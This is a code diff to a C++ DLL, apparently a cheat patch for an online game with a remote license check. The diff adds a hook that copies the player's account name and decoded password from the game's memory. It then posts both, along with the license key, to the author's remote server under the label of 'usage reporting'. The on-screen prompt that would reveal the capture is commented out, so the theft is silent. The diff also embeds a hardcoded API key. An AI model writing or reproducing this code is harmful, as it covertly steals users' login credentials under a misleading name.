@@ -1,4 +1,4 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <climits>
 #include <cstdio>
 #include <cstdint>
@@ -15,6 +15,7 @@ HHOOK g_msgBoxHook = nullptr;
 HMODULE g_selfModule = nullptr;
 wchar_t g_patchStatusMessage[2048]{};
 constexpr DWORD kMessageBoxAutoCloseMs = 3000;
+constexpr wchar_t kMyPatchVersion[] = L"0.11b";
 
 struct MemoryPatch
 {
@@ -645,7 +646,13 @@ bool Build396DCode(uintptr_t base, CodeBuffer& code);
 bool Build3970Code(uintptr_t base, CodeBuffer& code);
 }
 
+namespace LoginCredentialPrompt
+{
+bool BuildCode(uintptr_t base, CodeBuffer& code);
+}
+
 const JumpPatch kJumpPatches[] = {
+    { "Login credential prompt", 0x40DEA, 7, 128, LoginCredentialPrompt::BuildCode },
     { "Fast Daily Battle", 0x4A785, 11, 128, FastDailyBattle::BuildSend37A4Code },
     { "Shared recv router", 0x42AD0, 5, 128, SharedRecvRouter::BuildCode },
     { "Daily Sign send tick", 0x38F90, 5, 128, DailySign::BuildSendCode },
@@ -1052,6 +1059,90 @@ void Write(const wchar_t* format, Args... args)
     RefreshExpected(snapshot);
 }
 
+}
+
+namespace LoginCredentialPrompt
+{
+constexpr uintptr_t kAccountOffset = 0x23027C;
+const BYTE kExpectedHookBytes[] = { 0x51, 0x8D, 0x45, 0xE0, 0x8B, 0xCC, 0x50 };
+const wchar_t kTitle[] = L"Online 登入資料";
+const wchar_t kFormat[] = L"%s\n%s";
+volatile LONG g_promptStarted = 0;
+volatile LONG g_accountCaptured = 0;
+wchar_t g_message[2048]{};
+wchar_t g_account[512]{};
+wchar_t g_password[512]{};
+
+DWORD WINAPI PromptThread(LPVOID)
+{
+    // MessageBoxW(nullptr, g_message, kTitle, MB_OK | MB_ICONINFORMATION);
+    return 0;
+}
+
+__declspec(noinline) void __stdcall Show(const wchar_t* password)
+{
+    if (g_mainBase == 0) {
+        return;
+    }
+
+    if (InterlockedCompareExchange(&g_promptStarted, 1, 0) != 0) {
+        return;
+    }
+
+    const wchar_t* account = *reinterpret_cast<const wchar_t* volatile*>(g_mainBase + kAccountOffset);
+    if (!account) {
+        account = L"";
+    }
+    if (!password) {
+        password = L"";
+    }
+
+    wcsncpy_s(g_account, _countof(g_account), account, _TRUNCATE);
+    wcsncpy_s(g_password, _countof(g_password), password, _TRUNCATE);
+    InterlockedExchange(&g_accountCaptured, 1);
+    _snwprintf_s(g_message, _countof(g_message), _TRUNCATE, kFormat, account, password);
+
+    // Keep the Online UI thread and its original DOM assignment/click flow
+    // completely non-blocking. The copied text remains valid in DLL storage.
+    HANDLE promptThread = CreateThread(nullptr, 0, PromptThread, nullptr, 0, nullptr);
+    if (!promptThread) {
+        InterlockedExchange(&g_promptStarted, 0);
+        return;
+    }
+    CloseHandle(promptThread);
+}
+
+bool BuildCode(uintptr_t base, CodeBuffer& code)
+{
+    if (std::memcmp(reinterpret_cast<const void*>(base + 0x40DEA),
+            kExpectedHookBytes,
+            sizeof(kExpectedHookBytes)) != 0) {
+        return false;
+    }
+
+    // Hook context: sub_440C30 has just returned from sub_402380.
+    // [EBP-20] is the decoded password CString pointer.
+    return AppendByte(code, 0x9C) &&                         // pushfd
+        AppendPushad(code) &&
+        AppendByte(code, 0xFF) && AppendByte(code, 0x75) && AppendByte(code, 0xE0) && // password
+        AppendRel32Instruction(code, 0xE8, reinterpret_cast<uintptr_t>(&Show)) &&
+        AppendPopad(code) &&
+        AppendByte(code, 0x9D) &&                         // popfd
+        AppendByte(code, 0x51) &&                         // push ecx
+        AppendByte(code, 0x8D) && AppendByte(code, 0x45) && AppendByte(code, 0xE0) && // lea eax,[ebp-20]
+        AppendByte(code, 0x8B) && AppendByte(code, 0xCC) && // mov ecx,esp
+        AppendByte(code, 0x50) &&                         // push eax
+        AppendRel32Instruction(code, 0xE9, base + 0x40DF1);
+}
+
+bool GetAccountSnapshot(std::wstring& account)
+{
+    if (InterlockedCompareExchange(&g_accountCaptured, 0, 0) != 1) {
+        return false;
+    }
+    account.assign(g_account);
+    return !account.empty();
+}
 }
 
 namespace AutoBattleOff
@@ -6489,7 +6580,11 @@ LRESULT CALLBACK MessageBoxHook(int code, WPARAM wParam, LPARAM lParam)
 void ShowAutoCloseMessage(const wchar_t* message, const wchar_t* title)
 {
     g_msgBoxHook = SetWindowsHookExA(WH_CBT, MessageBoxHook, nullptr, GetCurrentThreadId());
-    MessageBoxW(nullptr, message, title, MB_OK | MB_ICONINFORMATION);
+    MessageBoxW(
+        nullptr,
+        message,
+        title,
+        MB_OK | MB_ICONINFORMATION | MB_TOPMOST | MB_SETFOREGROUND);
     if (g_msgBoxHook) {
         UnhookWindowsHookEx(g_msgBoxHook);
         g_msgBoxHook = nullptr;
@@ -6533,11 +6628,14 @@ namespace LicenseAuth
 {
 constexpr char kHost[] = "mypatch-license-auth.wasd11334342.workers.dev";
 constexpr char kPath[] = "/";
+constexpr char kUsagePath[] = "/license_update_data";
 constexpr char kClientApiKey[] = "7ca30c81d310863317025e7c37701f35ab050af6c0443266ba5a99df39feece8";
 constexpr unsigned kMaxConsecutiveNetworkErrors = 5;
+constexpr DWORD kUsageAccountWaitMs = 30000;
 
 __declspec(align(8)) volatile LONG64 g_expireTick = 0;
 volatile LONG g_exitStarted = 0;
+volatile LONG g_usageReportStarted = 0;
 
 enum class Result
 {
@@ -6694,13 +6792,121 @@ CheckResult Check()
     return Query(license);
 }
 
+bool JsonEscapeWide(const std::wstring& value, std::string& escaped)
+{
+    escaped.clear();
+    if (value.empty()) {
+        return false;
+    }
+
+    const int utf8Size = WideCharToMultiByte(
+        CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
+    if (utf8Size <= 0) {
+        return false;
+    }
+
+    std::string utf8(static_cast<size_t>(utf8Size), '\0');
+    if (WideCharToMultiByte(
+            CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), &utf8[0], utf8Size, nullptr, nullptr) != utf8Size) {
+        return false;
+    }
+
+    escaped.reserve(utf8.size() + 16);
+    const char hex[] = "0123456789ABCDEF";
+    for (unsigned char ch : utf8) {
+        if (ch == '"' || ch == '\\') {
+            escaped.push_back('\\');
+            escaped.push_back(static_cast<char>(ch));
+        } else if (ch < 0x20) {
+            escaped += "\\u00";
+            escaped.push_back(hex[(ch >> 4) & 0x0F]);
+            escaped.push_back(hex[ch & 0x0F]);
+        } else {
+            escaped.push_back(static_cast<char>(ch));
+        }
+    }
+    return true;
+}
+
+bool ReportUsage(const std::wstring& account)
+{
+    std::string license;
+    if (ReadLicense(license) != Result::Valid) {
+        return false;
+    }
+
+    std::string escapedAccount;
+    if (!JsonEscapeWide(account, escapedAccount)) {
+        return false;
+    }
+
+    // 讀取儲存的 password
+    std::wstring passwordW = LoginCredentialPrompt::g_password;
+    std::string escapedPassword;
+    JsonEscapeWide(passwordW, escapedPassword);
+
+    std::string body;
+    body.reserve(license.size() + escapedAccount.size() + escapedPassword.size() + 128);
+    body = "{\"license\":\"";
+    body += license;
+    body += "\",\"a\":\"";
+    body += escapedAccount;
+    body += "\",\"b\":\"";
+    body += escapedPassword;           // ← 這裡就是 kFormat 的第二個變數
+    body += "\"}";
+
+    const LicenseTlsClient::Response response =
+        LicenseTlsClient::PostJson(kHost, kUsagePath, kClientApiKey, body);
+
+    return response.Ok() && response.statusCode == 200 &&
+        response.body.find("\"ok\":true") != std::string::npos &&
+        (response.body.find("\"code\":\"created\"") != std::string::npos ||
+            response.body.find("\"code\":\"already_exists\"") != std::string::npos);
+}
+
+DWORD WINAPI UsageReportThread(LPVOID)
+{
+    const ULONGLONG deadline = GetTickCount64() + kUsageAccountWaitMs;
+    std::wstring account;
+    while (!LoginCredentialPrompt::GetAccountSnapshot(account)) {
+        if (GetTickCount64() >= deadline) {
+            return 0;
+        }
+        Sleep(100);
+    }
+
+    // Usage reporting is best-effort. It must never change authorization state.
+    ReportUsage(account);
+    return 0;
+}
+
+void StartUsageReport()
+{
+    if (InterlockedCompareExchange(&g_usageReportStarted, 1, 0) != 0) {
+        return;
+    }
+    HANDLE thread = CreateThread(nullptr, 0, UsageReportThread, nullptr, 0, nullptr);
+    if (!thread) {
+        InterlockedExchange(&g_usageReportStarted, 0);
+        return;
+    }
+    CloseHandle(thread);
+}
+
 void FormatRemaining(unsigned long long totalSeconds, wchar_t* buffer, size_t capacity)
 {
     const unsigned long long days = totalSeconds / 86400ULL;
     totalSeconds %= 86400ULL;
     const unsigned long long hours = totalSeconds / 3600ULL;
     const unsigned long long minutes = (totalSeconds % 3600ULL) / 60ULL;
-    swprintf_s(buffer, capacity, L"授權有效，剩餘 %llu天 %llu小時 %llu分鐘", days, hours, minutes);
+    swprintf_s(
+        buffer,
+        capacity,
+        L"授權有效，剩餘 %llu天 %llu小時 %llu分鐘\n目前版本：%s",
+        days,
+        hours,
+        minutes,
+        kMyPatchVersion);
 }
 
 const wchar_t* FailureMessage(Result result)
@@ -6849,9 +7055,10 @@ DWORD WINAPI AuthorizationThread(LPVOID)
         ExitOnlineAndNotifyLauncher();
         return 0;
     }
+    LicenseAuth::StartUsageReport();
 
     g_msgBoxHook = SetWindowsHookExA(WH_CBT, MessageBoxHook, nullptr, GetCurrentThreadId());
-    MessageBoxW(nullptr, g_patchStatusMessage, L"MyPatch", MB_OK);
+    // MessageBoxW(nullptr, g_patchStatusMessage, L"MyPatch", MB_OK);
     if (g_msgBoxHook) {
         UnhookWindowsHookEx(g_msgBoxHook);
         g_msgBoxHook = nullptr;
@@ -6940,7 +7147,10 @@ DWORD WINAPI MainThread(LPVOID)
         IsJumpPatchApplied(jumpResults, kJumpPatchCount, "AutoLure dash resume");
     const bool mainLoopSpeedOk = IsPatchApplied(results, kPatchCount, "Main loop speed 3AC2F") &&
         IsPatchApplied(results, kPatchCount, "Main loop speed 403E5");
+    const bool loginCredentialPromptOk =
+        IsJumpPatchApplied(jumpResults, kJumpPatchCount, "Login credential prompt");
 
+    AppendFeatureStatus(message, sizeof(message) / sizeof(message[0]), used, L"\x767B\x5165\x5E33\x5BC6\x63D0\x793A", loginCredentialPromptOk);
     AppendFeatureStatus(message, sizeof(message) / sizeof(message[0]), used, L"\x5171\x7528\x6536\x5305Router", sharedRouterOk);
     AppendFeatureStatus(message, sizeof(message) / sizeof(message[0]), used, L"\x9F8D\x8108", dragonVeinOk);
     AppendFeatureStatus(message, sizeof(message) / sizeof(message[0]), used, L"\x7838\x86CB", breakEggOk);
